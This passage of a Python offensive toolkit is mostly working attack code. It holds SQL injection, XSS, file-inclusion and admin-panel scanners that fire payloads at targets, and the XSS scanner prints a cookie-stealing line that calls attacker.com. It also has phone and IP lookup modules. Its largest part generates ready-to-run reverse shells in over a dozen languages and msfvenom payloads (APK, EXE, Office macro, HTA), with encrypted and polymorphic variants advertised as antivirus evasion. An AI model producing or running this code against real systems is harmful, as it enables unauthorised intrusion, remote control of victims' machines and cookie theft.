                response = requests.get(test_url, timeout=10, verify=False)
                response_time = time.time() - start_time
                
                # Check for SQL errors
                sql_errors = [
                    "sql syntax", "mysql_fetch", "ora-", "query failed",
                    "unclosed quotation", "microsoft ole db", "sql error",
                    "you have an error in your sql", "warning: mysql",
                    "ODBC", "Driver", "DB2", "PostgreSQL", "SQLite"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        vulnerable = True
                        found_payloads.append({"payload": payload, "error": error})
                        print(f"{Colors.RED}[!] SQL Injection DETECTED!{Colors.END}")
                        print(f"    Payload: {payload}")
                        print(f"    Error: {error}")
                        break
                
                # Time-based detection
                if response_time > 5:
                    vulnerable = True
                    print(f"{Colors.RED}[!] Time-based SQL Injection DETECTED!{Colors.END}")
                    print(f"    Payload: {payload}")
                    print(f"    Response time: {response_time}s")
                    
            except:
                pass
        
        if vulnerable:
            print(f"\n{Colors.GREEN}[+] Target is VULNERABLE to SQL Injection!{Colors.END}")
            
            # Auto exploit
            print(f"\n{Colors.CYAN}[*] Attempting to extract database info...{Colors.END}")
            
            # Extract database version
            version_payloads = [
                "' UNION SELECT @@version--",
                "' UNION SELECT version()--",
                "' UNION SELECT database()--",
                "' UNION SELECT user()--"
            ]
            
            for vp in version_payloads:
                try:
                    test_url = url + vp
                    response = requests.get(test_url, timeout=10, verify=False)
                    # Look for version patterns
                    version_patterns = [r'\d+\.\d+\.\d+', r'MySQL', r'MariaDB', r'PostgreSQL', r'SQLite']
                    for pattern in version_patterns:
                        match = re.search(pattern, response.text, re.IGNORECASE)
                        if match:
                            print(f"{Colors.GREEN}[+] Found: {match.group()}{Colors.END}")
                            break
                except:
                    pass
            
            # Save result
            filename = f"{self.scan_dir}/sqli_vuln_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"SQL Injection Vulnerability Found\n")
                f.write(f"URL: {url}\n")
                f.write(f"Payloads: {found_payloads}\n")
            print(f"{Colors.GREEN}[+] Report saved: {filename}{Colors.END}")
            
        else:
            print(f"{Colors.GREEN}[+] No SQL Injection vulnerability found{Colors.END}")
    
    def real_xss_exploit(self, url):
        """REAL XSS Scanner & Exploit"""
        import requests
        
        print(f"{Colors.CYAN}[*] Scanning XSS on: {url}{Colors.END}\n")
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "'><script>alert(1)</script>",
            "><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>"
        ]
        
        vulnerable = False
        found_payloads = []
        
        for payload in payloads:
            try:
                test_url = url.replace("=", f"={payload}")
                if "?" in url:
                    test_url = url + payload
                else:
                    test_url = url + "?q=" + payload
                    
                response = requests.get(test_url, timeout=10, verify=False)
                
                if payload in response.text:
                    vulnerable = True
                    found_payloads.append(payload)
                    print(f"{Colors.RED}[!] XSS DETECTED!{Colors.END}")
                    print(f"    Payload: {payload[:50]}")
                    
            except:
                pass
        
        if vulnerable:
            print(f"\n{Colors.GREEN}[+] Target is VULNERABLE to XSS!{Colors.END}")
            print(f"{Colors.CYAN}[*] Proof of Concept:{Colors.END}")
            print(f"    <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>")
            
            filename = f"{self.scan_dir}/xss_vuln_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"XSS Vulnerability Found\nURL: {url}\nPayloads: {found_payloads}\n")
            print(f"{Colors.GREEN}[+] Report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No XSS vulnerability found{Colors.END}")
    
    def real_lfi_exploit(self, url):
        """REAL LFI/RFI Scanner & Exploit"""
        import requests
        
        print(f"{Colors.CYAN}[*] Scanning LFI/RFI on: {url}{Colors.END}\n")
        
        # LFI payloads
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "file:///etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd"
        ]
        
        # RFI payloads
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/xxxx",
            "http://localhost/shell.php"
        ]
        
        vulnerable = False
        
        # Test LFI
        for payload in lfi_payloads:
            try:
                test_url = url + payload
                response = requests.get(test_url, timeout=10, verify=False)
                
                lfi_indicators = ["root:", "daemon:", "bin:", "[extensions]", "[fonts]", "boot.ini"]
                for indicator in lfi_indicators:
                    if indicator in response.text:
                        vulnerable = True
                        print(f"{Colors.RED}[!] LFI DETECTED!{Colors.END}")
                        print(f"    Payload: {payload}")
                        print(f"    Content preview: {response.text[:200]}")
                        break
            except:
                pass
        
        # Test RFI
        for payload in rfi_payloads:
            try:
                test_url = url + payload
                response = requests.get(test_url, timeout=10, verify=False)
                if "<?php" in response.text or "<?=" in response.text:
                    vulnerable = True
                    print(f"{Colors.RED}[!] RFI DETECTED!{Colors.END}")
                    print(f"    Payload: {payload}")
            except:
                pass
        
        if vulnerable:
            print(f"\n{Colors.GREEN}[+] Target is VULNERABLE to File Inclusion!{Colors.END}")
            
            filename = f"{self.scan_dir}/lfi_vuln_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"LFI/RFI Vulnerability Found\nURL: {url}\n")
            print(f"{Colors.GREEN}[+] Report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No LFI/RFI vulnerability found{Colors.END}")
    
    def real_admin_finder(self, target):
        """REAL Admin Panel Finder"""
        import requests
        import threading
        import time
        
        print(f"{Colors.CYAN}[*] Scanning for admin panels on: {target}{Colors.END}\n")
        
        admin_paths = [
            "admin", "administrator", "admin.php", "admin/", "admin/login",
            "wp-admin", "wp-login.php", "cpanel", "login", "dashboard",
            "admincp", "modcp", "adminarea", "backend", "manage",
            "administrator/index.php", "admin/index.php", "login.php",
            "user/login", "auth/login", "panel", "cp", "controlpanel"
        ]
        
        found = []
        
        def check_path(path):
            try:
                full_url = f"http://{target}/{path}"
                response = requests.get(full_url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Found: {full_url}{Colors.END}")
                    found.append(full_url)
                elif response.status_code == 403:
                    print(f"{Colors.YELLOW}[?] Access denied: {full_url}{Colors.END}")
                    found.append(f"{full_url} (403)")
                elif response.status_code == 302:
                    print(f"{Colors.BLUE}[>] Redirect: {full_url}{Colors.END}")
            except:
                pass
        
        threads = []
        for path in admin_paths:
            t = threading.Thread(target=check_path, args=(path,))
            t.start()
            threads.append(t)
            time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        if found:
            print(f"\n{Colors.GREEN}[+] Found {len(found)} admin panels{Colors.END}")
            filename = f"{self.scan_dir}/admin_panels_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"Admin Panels found for {target}\n")
                for url in found:
                    f.write(f"{url}\n")
            print(f"{Colors.GREEN}[+] Report saved: {filename}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No admin panels found{Colors.END}")
    
    def real_full_auto_exploit(self, target):
        """FULL AUTO EXPLOIT - All scanners combined"""
        import threading
        
        print(f"{Colors.RED}{Colors.BOLD}[!] ACTIVATING FULL AUTO EXPLOIT!{Colors.END}")
        print(f"{Colors.CYAN}[*] Target: {target}{Colors.END}")
        print(f"{Colors.CYAN}[*] Running all scanners...{Colors.END}\n")
        
        # Run all scans in parallel
        t1 = threading.Thread(target=self.real_sqli_exploit, args=(target,))
        t2 = threading.Thread(target=self.real_xss_exploit, args=(target,))
        t3 = threading.Thread(target=self.real_lfi_exploit, args=(target,))
        t4 = threading.Thread(target=self.real_admin_finder, args=(target.replace("http://", "").replace("https://", "").split("/")[0],))
        
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        
        t1.join()
        t2.join()
        t3.join()
        t4.join()
        
        print(f"\n{Colors.GREEN}[+] Full Auto Exploit Completed!{Colors.END}")
    
    def real_wp_scanner(self, target):
        """WordPress Vulnerability Scanner"""
        import requests
        
        print(f"{Colors.CYAN}[*] Scanning WordPress on: {target}{Colors.END}\n")
        
        # Common WordPress paths
        wp_paths = [
            "wp-admin", "wp-login.php", "wp-content", "wp-includes",
            "xmlrpc.php", "wp-json", "wp-config.php.bak", ".htaccess"
        ]
        
        # Check WordPress version
        try:
            response = requests.get(f"{target}/wp-content/themes/", timeout=10, verify=False)
            if "twentytwenty" in response.text or "wp-content" in response.text:
                print(f"{Colors.GREEN}[+] WordPress detected!{Colors.END}")
        except:
            pass
        
        # Scan for vulnerable plugins
        common_plugins = [
            "wp-file-manager", "elementor", "woocommerce", "contact-form-7",
            "yoast-seo", "wordfence", "akismet", "jetpack", "wp-rocket"
        ]
        
        for plugin in common_plugins:
            try:
                test_url = f"{target}/wp-content/plugins/{plugin}/readme.txt"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.YELLOW}[!] Plugin found: {plugin}{Colors.END}")
                    
                    # Check version
                    if "Stable tag:" in response.text:
                        version = response.text.split("Stable tag:")[1].split("\n")[0].strip()
                        print(f"    Version: {version}")
            except:
                pass
        
        # Scan for vulnerable themes
        common_themes = ["twentytwentyone", "twentytwentytwo", "astra", "hello-elementor"]
        for theme in common_themes:
            try:
                test_url = f"{target}/wp-content/themes/{theme}/style.css"
                response = requests.get(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    print(f"{Colors.GREEN}[+] Theme found: {theme}{Colors.END}")
            except:
                pass
        
        # Check XML-RPC
        try:
            response = requests.get(f"{target}/xmlrpc.php", timeout=5, verify=False)
            if "XML-RPC" in response.text:
                print(f"{Colors.RED}[!] XML-RPC enabled (potential DDoS vector){Colors.END}")
        except:
            pass
        
        # Save report
        filename = f"{self.scan_dir}/wp_scan_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"WordPress Scan for {target}\n")
        print(f"\n{Colors.GREEN}[+] Report saved: {filename}{Colors.END}")
        
    # ==================== OSINT MODULES ====================
    
    def phone_osint(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    PHONE OSINT MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        raw = input(f"{self.prompt()}phone number > ").strip()
        clean = re.sub(r'[^0-9+]', '', raw)
        
        if clean.startswith('0'):
            num = '+62' + clean[1:]
        elif clean.startswith('62') and not clean.startswith('+'):
            num = '+' + clean
        elif not clean.startswith('+'):
            num = '+62' + clean
        else:
            num = clean
        
        # Indonesian carrier database
        prefixes = {
            '811': 'Telkomsel', '812': 'Telkomsel', '813': 'Telkomsel',
            '814': 'Indosat', '815': 'Indosat', '816': 'Indosat',
            '817': 'XL Axiata', '818': 'XL Axiata', '819': 'XL Axiata',
            '821': 'Telkomsel', '822': 'Telkomsel', '823': 'Telkomsel',
            '831': 'Axis', '832': 'Axis', '833': 'Axis',
            '896': 'Tri', '897': 'Tri', '898': 'Tri', '899': 'Tri'
        }
        
        part = num.replace('+62', '')
        pref = part[:3] if len(part) >= 3 else part
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}📱 PHONE OSINT RESULTS{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
        print(f"{Colors.CYAN}Number     :{Colors.WHITE} {num}")
        if pref in prefixes:
            print(f"{Colors.CYAN}Carrier    :{Colors.GREEN} {prefixes[pref]}{Colors.END}")
        print(f"{lColors.CYAN}Length     :{Colors.WHITE} {len(part)} digits")
        
        print(f"\n{Colors.YELLOW}[*] OSINT Links:{Colors.END}")
        print(f"    WhatsApp  : https://wa.me/{num}")
        print(f"    Telegram  : https://t.me/+{num[1:]}")
        print(f"    Google    : https://www.google.com/search?q={num}")
        
        filename = f"{self.osint_dir}/phone_{num.replace('+','')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Phone: {num}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
    
    def ip_tracker(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    IP TRACKER MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        target = input(f"{self.prompt()}IP address > ")
        
        try:
            r = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            data = r.json()
            if data.get('status') == 'success':
                print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
                print(f"{Colors.BOLD}🌍 IP GEOLOCATION RESULTS{Colors.END}")
                print(f"{Colors.GREEN}{'='*55}{Colors.END}\n")
                print(f"{Colors.CYAN}IP Address :{Colors.WHITE} {data.get('query')}")
                print(f"{Colors.CYAN}Country    :{Colors.WHITE} {data.get('country')} ({data.get('countryCode')})")
                print(f"{Colors.CYAN}Region     :{Colors.WHITE} {data.get('regionName')}")
                print(f"{Colors.CYAN}City       :{Colors.WHITE} {data.get('city')}")
                print(f"{Colors.CYAN}ISP        :{Colors.WHITE} {data.get('isp')}")
                print(f"\n{Colors.YELLOW}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                
                filename = f"{self.osint_dir}/ip_{target}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(data, indent=2))
                print(f"{Colors.GREEN}[+] Saved to: {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] IP not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
    
    def generate_payload(self):
        """REAL Payload Generator - Multiple Languages & Obfuscation"""
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    REAL PAYLOAD GENERATOR                             ║
║              Production-Ready Reverse Shells                          ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Python Reverse Shell")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Python Encrypted Reverse Shell")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Python Polymorphic Shell")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} Bash Reverse Shell")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} PowerShell Reverse Shell")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} PHP Reverse Shell")
        print(f"{Colors.GREEN}[7]{Colors.WHITE} Perl Reverse Shell")
        print(f"{Colors.GREEN}[8]{Colors.WHITE} Ruby Reverse Shell")
        print(f"{Colors.GREEN}[9]{Colors.WHITE} Netcat Reverse Shell")
        print(f"{Colors.GREEN}[10]{Colors.WHITE} Java Reverse Shell")
        print(f"{Colors.GREEN}[11]{Colors.WHITE} Node.js Reverse Shell")
        print(f"{Colors.GREEN}[12]{Colors.WHITE} Golang Reverse Shell")
        print(f"{Colors.GREEN}[13]{Colors.WHITE} C Reverse Shell (Windows/Linux)")
        print(f"{Colors.GREEN}[14]{Colors.WHITE} Android Reverse Shell (APK)")
        print(f"{Colors.GREEN}[15]{Colors.WHITE} Windows EXE Payload (msfvenom)")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Back")
        
        choice = input(self.prompt())
        
        lhost = input(f"{self.prompt()}LHOST (Your IP) > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        if choice == '1':
            self.python_reverse_shell(lhost, lport)
        elif choice == '2':
            self.python_encrypted_shell(lhost, lport)
        elif choice == '3':
            self.python_polymorphic_shell(lhost, lport)
        elif choice == '4':
            self.bash_reverse_shell(lhost, lport)
        elif choice == '5':
            self.powershell_reverse_shell(lhost, lport)
        elif choice == '6':
            self.php_reverse_shell(lhost, lport)
        elif choice == '7':
            self.perl_reverse_shell(lhost, lport)
        elif choice == '8':
            self.ruby_reverse_shell(lhost, lport)
        elif choice == '9':
            self.netcat_reverse_shell(lhost, lport)
        elif choice == '10':
            self.java_reverse_shell(lhost, lport)
        elif choice == '11':
            self.nodejs_reverse_shell(lhost, lport)
        elif choice == '12':
            self.golang_reverse_shell(lhost, lport)
        elif choice == '13':
            self.c_reverse_shell(lhost, lport)
        elif choice == '14':
            self.android_reverse_shell(lhost, lport)
        elif choice == '15':
            self.windows_exe_payload(lhost, lport)
    
    def python_reverse_shell(self, lhost, lport):
        """Standard Python Reverse Shell"""
        payload = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import pty

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    connect()
'''
        filename = f"{self.payload_dir}/python_reverse_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Python Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: python3 {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Listener: nc -lvnp {lport}{Colors.END}")
    
    def python_encrypted_shell(self, lhost, lport):
        """Encrypted Python Reverse Shell (AES)"""
        import base64
        from cryptography.fernet import Fernet
        
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        plain_payload = f'''import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")'''
        
        encrypted = cipher.encrypt(plain_payload.encode())
        b64_encrypted = base64.b64encode(encrypted).decode()
        b64_key = base64.b64encode(key).decode()
        
        payload = f'''#!/usr/bin/env python3
import base64
from cryptography.fernet import Fernet

key = base64.b64decode("{b64_key}")
cipher = Fernet(key)
encrypted = base64.b64decode("{b64_encrypted}")
exec(cipher.decrypt(encrypted).decode())
'''
        filename = f"{self.payload_dir}/python_encrypted_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Encrypted Python Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] AV Evasion: AES-256 Encrypted{Colors.END}")
    
    def python_polymorphic_shell(self, lhost, lport):
        """Polymorphic Python Shell (Changes signature every time)"""
        import random
        import string
        
        junk_vars = []
        for i in range(random.randint(10, 30)):
            junk_vars.append(f"{''.join(random.choices(string.ascii_letters, k=8))} = {random.randint(1,9999)}")
        
        junk_funcs = []
        for i in range(random.randint(5, 15)):
            func_name = ''.join(random.choices(string.ascii_letters, k=8))
            junk_funcs.append(f'''
def {func_name}():
    x = {random.randint(1,1000)}
    y = {random.randint(1,1000)}
    return x * y - {random.randint(1,500)}''')
        
        payload = f'''#!/usr/bin/env python3
# Polymorphic Shell - Signature changes each generation
{chr(10).join(junk_vars)}
{chr(10).join(junk_funcs)}
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''
        filename = f"{self.payload_dir}/python_polymorphic_{int(time.time())}.py"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Polymorphic Python Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] AV Evasion: Random junk code injected{Colors.END}")
    
    def bash_reverse_shell(self, lhost, lport):
        """Bash Reverse Shell"""
        payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line; do $line 2>&5 >&5; done"
        ]
        
        for i, payload in enumerate(payloads):
            filename = f"{self.payload_dir}/bash_reverse_{i}_{int(time.time())}.sh"
            with open(filename, 'w') as f:
                f.write("#!/bin/bash\n" + payload)
            os.chmod(filename, 0o755)
            print(f"{Colors.GREEN}[+] Bash payload {i+1}: {filename}{Colors.END}")
        
        print(f"{Colors.CYAN}[*] Run on target: bash payload.sh{Colors.END}")
    
    def powershell_reverse_shell(self, lhost, lport):
        """PowerShell Reverse Shell (Windows)"""
        payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
        
        # One-liner version
        oneliner = f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"'''
        
        filename = f"{self.payload_dir}/powershell_reverse_{int(time.time())}.ps1"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] PowerShell Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: powershell -ExecutionPolicy Bypass -File {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] One-liner:{Colors.END}")
        print(f"    {oneliner}")
    
    def php_reverse_shell(self, lhost, lport):
        """PHP Reverse Shell"""
        payload = f'''<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>'''
        
        filename = f"{self.payload_dir}/php_reverse_{int(time.time())}.php"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] PHP Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: php {filename}{Colors.END}")
    
    def perl_reverse_shell(self, lhost, lport):
        """Perl Reverse Shell"""
        payload = f'''#!/usr/bin/perl
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}'''
        
        filename = f"{self.payload_dir}/perl_reverse_{int(time.time())}.pl"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Perl Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: perl {filename}{Colors.END}")
    
    def ruby_reverse_shell(self, lhost, lport):
        """Ruby Reverse Shell"""
        payload = f'''#!/usr/bin/ruby
require 'socket'
c=TCPSocket.new("{lhost}",{lport})
while(cmd=c.gets)
    IO.popen(cmd,"r"){{|io|c.print io.read}}
end'''
        
        filename = f"{self.payload_dir}/ruby_reverse_{int(time.time())}.rb"
        with open(filename, 'w') as f:
            f.write(payload)
        os.chmod(filename, 0o755)
        
        print(f"\n{Colors.GREEN}[+] Ruby Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: ruby {filename}{Colors.END}")
    
    def netcat_reverse_shell(self, lhost, lport):
        """Netcat Reverse Shell"""
        payloads = [
            f"nc -e /bin/sh {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            f"nc {lhost} {lport} -e /bin/bash"
        ]
        
        for i, payload in enumerate(payloads):
            filename = f"{self.payload_dir}/netcat_reverse_{i}_{int(time.time())}.sh"
            with open(filename, 'w') as f:
                f.write("#!/bin/bash\n" + payload)
            os.chmod(filename, 0o755)
            print(f"{Colors.GREEN}[+] Netcat payload {i+1}: {filename}{Colors.END}")
    
    def java_reverse_shell(self, lhost, lport):
        """Java Reverse Shell"""
        payload = f'''public class Rev {{
    public static void main(String[] args) throws Exception {{
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line; do $line 2>&5 >&5; done"}});
        p.waitFor();
    }}
}}'''
        
        filename = f"{self.payload_dir}/JavaRev.java"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] Java Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Compile: javac {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run: java Rev{Colors.END}")
    
    def nodejs_reverse_shell(self, lhost, lport):
        """Node.js Reverse Shell"""
        payload = f'''(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({lport}, "{lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
}})();'''
        
        filename = f"{self.payload_dir}/nodejs_reverse_{int(time.time())}.js"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] Node.js Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Run on target: node {filename}{Colors.END}")
    
    def golang_reverse_shell(self, lhost, lport):
        """Golang Reverse Shell"""
        payload = f'''package main
import (
    "net"
    "os/exec"
    "time"
)
func main() {{
    for {{
        c, err := net.Dial("tcp", "{lhost}:{lport}")
        if err == nil {{
            cmd := exec.Command("/bin/sh")
            cmd.Stdin = c
            cmd.Stdout = c
            cmd.Stderr = c
            cmd.Run()
            c.Close()
        }}
        time.Sleep(5 * time.Second)
    }}
}}'''
        
        filename = f"{self.payload_dir}/golang_reverse.go"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] Golang Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Compile: go build {filename}{Colors.END}")
    
    def c_reverse_shell(self, lhost, lport):
        """C Reverse Shell (Linux/Windows)"""
        payload = f'''#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({lport});
    addr.sin_addr.s_addr = inet_addr("{lhost}");
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}}'''
        
        filename = f"{self.payload_dir}/c_reverse.c"
        with open(filename, 'w') as f:
            f.write(payload)
        
        print(f"\n{Colors.GREEN}[+] C Payload saved: {filename}{Colors.END}")
        print(f"{Colors.CYAN}[*] Compile Linux: gcc {filename} -o reverse{Colors.END}")
        print(f"{Colors.CYAN}[*] Compile Windows: x86_64-w64-mingw32-gcc {filename} -o reverse.exe{Colors.END}")
    
    def android_reverse_shell(self, lhost, lport):
        """Android Reverse Shell (APK)"""
        print(f"{Colors.CYAN}[*] Generating Android payload...{Colors.END}")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {self.payload_dir}/android_reverse_{int(time.time())}.apk")
        print(f"{Colors.GREEN}[+] Android APK saved{Colors.END}")
    
    def windows_exe_payload(self, lhost, lport):
        """Windows EXE Payload using msfvenom"""
        print(f"{Colors.CYAN}[*] Generating Windows EXE payload...{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.WHITE} EXE (x86)")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} EXE (x64)")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} VBA (Office Macro)")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} HTA")
        
        subchoice = input(self.prompt())
        
        if subchoice == '1':
            os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {self.payload_dir}/windows_reverse_x86.exe")
        elif subchoice == '2':
            os.system(f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {self.payload_dir}/windows_reverse_x64.exe")
        elif subchoice == '3':
            os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f vba -o {self.payload_dir}/macro.txt")
        elif subchoice == '4':
            os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh -o {self.payload_dir}/payload.hta")
        
        print(f"{Colors.GREEN}[+] Payload generated in {self.payload_dir}{Colors.END}")
        
    def username_check(self):
        print(f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════╗
║                    USERNAME OSINT MODULE                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        username = input(f"{self.prompt()}username > ")
        
        sites = {
            "Instagram": f"https://instagram.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
